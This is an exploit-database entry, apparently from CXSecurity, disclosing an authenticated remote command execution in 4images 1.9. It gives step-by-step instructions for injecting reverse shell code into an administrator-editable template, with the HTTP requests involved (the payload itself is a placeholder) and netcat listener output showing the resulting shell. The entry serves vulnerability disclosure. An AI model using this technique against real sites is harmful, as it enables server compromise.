---
title: 4images 1.9 Remote Command Execution
url: https://cxsecurity.com/issue/WLB-2022120048
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-12-28
fetch_date: 2025-10-04T02:34:14.920419
---

# 4images 1.9 Remote Command Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **4images 1.9 Remote Command Execution** **2022.12.27**  Credit:  **[Andrey Stoykov](https://cxsecurity.com/author/Andrey%2BStoykov/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-78](https://cxsecurity.com/cwe/CWE-78 "Click to see CWE-78")** | |

# Exploit Title: 4images 1.9 - Remote Command Execution
# Exploit Author: Andrey Stoykov
# Software Link: https://www.4homepages.de/download-4images
# Version: 1.9
# Tested on: Ubuntu 20.04
To reproduce do the following:
1. Login as administrator user
2. Browse to "General" -> " Edit Templates" -> "Select Template Pack" -> "default\_960px" -> "Load Theme"
3. Select Template "categories.html"
4. Paste reverse shell code
5. Click "Save Changes"
6. Browse to "http://host/4images/categories.php?cat\_id=1"
// HTTP POST request showing reverse shell payload
POST /4images/admin/templates.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
[...]
\_\_csrf=c39b7dea0ff15442681362d2a583c7a9&action=savetemplate&content=[REVERSE\_SHELL\_CODE]&template\_file\_name=categories.html&template\_folder=default\_960px[...]
// HTTP redirect response to specific template
GET /4images/categories.php?cat\_id=1 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
[...]
# nc -kvlp 4444
listening on [any] 4444 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 43032
Linux kali 6.0.0-kali3-amd64 #1 SMP PREEMPT\_DYNAMIC Debian 6.0.7-1kali1 (2022-11-07) x86\_64 GNU/Linux
13:54:28 up 2:18, 2 users, load average: 0.09, 0.68, 0.56
USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT
kali tty7 :0 11:58 2:18m 2:21 0.48s xfce4-session
kali pts/1 - 11:58 1:40 24.60s 0.14s sudo su
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022120048)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 -1

0%

100%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top